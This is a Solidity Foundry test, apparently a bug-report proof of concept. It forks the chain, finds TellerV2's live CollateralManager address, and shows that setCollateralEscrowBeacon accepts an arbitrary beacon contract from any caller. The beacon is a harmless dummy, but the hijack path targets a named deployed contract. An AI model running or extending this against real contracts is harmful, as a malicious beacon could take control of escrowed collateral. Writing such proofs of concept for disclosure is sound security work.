// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
}

interface ITellerV2 {
    function collateralManager() external view returns (address);
}

contract DummyBeacon {}

contract BeaconHijackTest is Test {
    address constant TELLER_V2   = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;

    address constant CM_OPTION_A = 0xD9149bfBfB29cC175041937eF8161600b464051B;
    address constant CM_OPTION_B = 0x714439261fFF24137b9cf79C1f564Bd8A09Ae416;
    // ✅ The address TellerV2 actually reports via collateralManager()
    address constant CM_OPTION_C = 0x71B04a8569914bCb99D5F95644CF6b089c826024;

    address internal resolvedCM;
    ICollateralManager cm;

    function setUp() public {
        address actualCM = ITellerV2(TELLER_V2).collateralManager();

        console.log("Forked at block:", block.number);
        console.log("TellerV2.collateralManager() =", actualCM);
        console.log("Option A =", CM_OPTION_A);
        console.log("Option B =", CM_OPTION_B);
        console.log("Option C =", CM_OPTION_C);

        require(
            actualCM == CM_OPTION_A ||
            actualCM == CM_OPTION_B ||
            actualCM == CM_OPTION_C,
            "TellerV2's CollateralManager is none of A, B, or C"
        );

        resolvedCM = actualCM;
        cm = ICollateralManager(resolvedCM);

        if (actualCM == CM_OPTION_A) {
            console.log("RESOLVED: Option A is the real CollateralManager");
        } else if (actualCM == CM_OPTION_B) {
            console.log("RESOLVED: Option B is the real CollateralManager");
        } else {
            console.log("RESOLVED: Option C is the real CollateralManager");
        }
        console.log("Testing against:", resolvedCM);
    }

    function test_SetCollateralEscrowBeacon_NoAccessControl() public {
        DummyBeacon dummy = new DummyBeacon();
        address maliciousBeacon = address(dummy);

        console.log("Attempting to set malicious beacon to:", maliciousBeacon);

        cm.setCollateralEscrowBeacon(maliciousBeacon);

        console.log("SUCCESS: Protocol accepted the malicious beacon.");
        console.log("The protocol is VULNERABLE to escrow beacon hijacking.");
    }
}
